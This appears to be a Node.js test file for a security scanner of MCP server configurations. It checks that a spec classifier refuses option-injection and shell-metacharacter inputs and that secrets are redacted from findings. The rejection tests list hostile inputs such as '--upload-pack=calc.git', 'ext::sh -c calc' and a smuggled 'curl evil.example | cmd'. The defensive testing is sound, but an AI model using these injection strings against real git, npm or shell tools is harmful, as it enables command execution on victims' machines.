import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import { classify, resolveTarget } from "../dist/scanner/fetch-target.js";
import { scanMcpConfigs } from "../dist/scanner/mcp-config-scanner.js";
import { generateBom } from "../dist/scanner/bom.js";
import { describeLauncher, redactUrl } from "../dist/utils/redact.js";

const cliPath = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "dist", "index.js");

// A spec reaches git/npm from a client config or from the model (the MCP
// scan_untrusted_target tool), so anything that is not one of the known shapes
// must be refused before a subprocess is spawned.
test("classify refuses specs that git or npm would read as options", () => {
  for (const spec of ["--upload-pack=calc.git", "-c", "--registry=http://evil.example", "-x"]) {
    assert.throws(() => classify(spec), /leading "-"/, spec);
  }
});

test("classify refuses shell metacharacters and non-registry npm forms", () => {
  for (const spec of [
    "foo&calc",
    "foo|bar",
    'x" & curl evil.example | cmd',
    "foo bar",
    "foo;rm",
    "pkg@^1.0.0",
    "pkg@>=1",
    "git+ssh://git@host/o/r.git",
    "github:owner/repo",
    "file:../x",
    "ext::sh -c calc",
    "ssh://host/path.git",
  ]) {
    assert.throws(() => classify(spec), /is not a local path/, spec);
  }
});

test("classify accepts the supported shapes", () => {
  assert.equal(classify("https://github.com/owner/repo"), "git");
  assert.equal(classify("https://github.com/owner/repo.git"), "git");
  assert.equal(classify("git@github.com:owner/repo.git"), "git");
  assert.equal(classify("owner/repo"), "git");
  assert.equal(classify("some-mcp-server"), "npm");
  assert.equal(classify("some-mcp-server@1.2.3"), "npm");
  assert.equal(classify("@scope/name"), "npm");
  assert.equal(classify("@scope/name@latest"), "npm");
  assert.equal(classify("test-fixtures"), "local");
});

test("resolveTarget throws before spawning anything for a refused spec", () => {
  assert.throws(() => resolveTarget("--upload-pack=calc.git"), /leading "-"/);
  assert.throws(() => resolveTarget("foo&calc"), /is not a local path/);
});

test("mcp <hostile-spec> exits non-zero through the CLI and never reaches a shell", () => {
  for (const spec of ["foo&echo SHELL_RAN", "x|echo SHELL_RAN"]) {
    let result;
    try {
      result = { stdout: execFileSync("node", [cliPath, "mcp", spec], { encoding: "utf-8", stdio: "pipe" }), status: 0 };
    } catch (err) {
      result = { stdout: err.stdout?.toString() ?? "", stderr: err.stderr?.toString() ?? "", status: err.status };
    }
    assert.equal(result.status, 1, spec);
    assert.match(result.stderr, /is not a local path/);
    assert.doesNotMatch(result.stdout, /^SHELL_RAN$/m);
  }
});

function writeMcpConfig(servers) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "secureai-redact-"));
  fs.writeFileSync(path.join(dir, ".mcp.json"), JSON.stringify({ mcpServers: servers }, null, 2));
  return dir;
}

test("redactUrl keeps scheme and host only", () => {
  assert.equal(redactUrl("http://user:pw@host.example:8080/sse/TOKEN?key=SECRET#frag"), "http://host.example:8080");
  assert.equal(redactUrl("http://host.example/x?key=SECRET"), "http://host.example");
  assert.equal(redactUrl("not a url ?key=SECRET"), "not a url ");
});

test("describeLauncher shows the package for runners and drops every other argument", () => {
  assert.equal(describeLauncher("npx", ["-y", "pkg", "--api-key=SECRET"]), "npx pkg …");
  assert.equal(describeLauncher("npx", ["pkg"]), "npx pkg");
  assert.equal(describeLauncher("node", ["server.js", "--token", "SECRET"]), "node …");
  assert.equal(describeLauncher("server"), "server");
});

test("MCP004/MCP006 summaries never echo tokens from the config", () => {
  const dir = writeMcpConfig({
    runner: { command: "npx", args: ["-y", "some-mcp", "--api-key=sk-LIVE-SECRET-123"] },
    remote: { url: "http://mcp.example.com/sse/PATHTOKEN?key=QUERY-SECRET" },
  });
  const findings = scanMcpConfigs(dir);
  const mcp004 = findings.find((f) => f.rule_id === "MCP004");
  const mcp006 = findings.find((f) => f.rule_id === "MCP006");
  assert.ok(mcp004 && mcp006, "both findings must still fire");
  const everything = JSON.stringify(findings);
  for (const secret of ["sk-LIVE-SECRET-123", "QUERY-SECRET", "PATHTOKEN"]) {
    assert.ok(!everything.includes(secret), `${secret} leaked into a finding`);
  }
  assert.match(mcp004.summary, /some-mcp/);
  assert.match(mcp006.summary, /mcp\.example\.com/);
});

test("the AI-BOM does not echo tokens from MCP server configs", () => {
  const dir = writeMcpConfig({
    runner: { command: "npx", args: ["-y", "some-mcp@1.0.0", "--api-key=sk-LIVE-SECRET-123"] },
    remote: { url: "https://user:pw@mcp.example.com/sse?key=QUERY-SECRET" },
  });
  const out = JSON.stringify(generateBom(dir));
  for (const secret of ["sk-LIVE-SECRET-123", "QUERY-SECRET", "user:pw"]) {
    assert.ok(!out.includes(secret), `${secret} leaked into the BOM`);
  }
  assert.match(out, /some-mcp@1\.0\.0/);
});
